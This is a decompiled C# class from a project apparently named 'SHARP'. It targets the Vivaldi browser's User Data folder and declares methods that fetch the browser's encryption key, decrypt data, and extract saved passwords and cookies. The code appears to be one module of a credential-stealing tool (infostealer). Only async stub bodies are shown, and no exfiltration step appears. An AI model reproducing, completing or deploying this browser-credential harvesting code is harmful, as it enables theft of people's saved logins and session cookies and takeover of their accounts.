﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000029 RID: 41
	internal static class Vivaldi
	{
		// Token: 0x060000E2 RID: 226 RVA: 0x0000598C File Offset: 0x00003B8C
		private static Task<byte[]> GetEncryptionKey()
		{
			Vivaldi.<GetEncryptionKey>d__3 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<Vivaldi.<GetEncryptionKey>d__3>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x000059C8 File Offset: 0x00003BC8
		private static Task<byte[]> DecryptData(byte[] buffer)
		{
			Vivaldi.<DecryptData>d__4 <DecryptData>d__;
			<DecryptData>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<DecryptData>d__.buffer = buffer;
			<DecryptData>d__.<>1__state = -1;
			<DecryptData>d__.<>t__builder.Start<Vivaldi.<DecryptData>d__4>(ref <DecryptData>d__);
			return <DecryptData>d__.<>t__builder.Task;
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00005A0C File Offset: 0x00003C0C
		internal static Task<PasswordFormat[]> GetPasswords()
		{
			Vivaldi.<GetPasswords>d__5 <GetPasswords>d__;
			<GetPasswords>d__.<>t__builder = AsyncTaskMethodBuilder<PasswordFormat[]>.Create();
			<GetPasswords>d__.<>1__state = -1;
			<GetPasswords>d__.<>t__builder.Start<Vivaldi.<GetPasswords>d__5>(ref <GetPasswords>d__);
			return <GetPasswords>d__.<>t__builder.Task;
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x00005A48 File Offset: 0x00003C48
		internal static Task<CookieFormat[]> GetCookies()
		{
			Vivaldi.<GetCookies>d__6 <GetCookies>d__;
			<GetCookies>d__.<>t__builder = AsyncTaskMethodBuilder<CookieFormat[]>.Create();
			<GetCookies>d__.<>1__state = -1;
			<GetCookies>d__.<>t__builder.Start<Vivaldi.<GetCookies>d__6>(ref <GetCookies>d__);
			return <GetCookies>d__.<>t__builder.Task;
		}

		// Token: 0x04000063 RID: 99
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi", "User Data");

		// Token: 0x04000064 RID: 100
		private static byte[] _encryptionKey = null;
	}
}
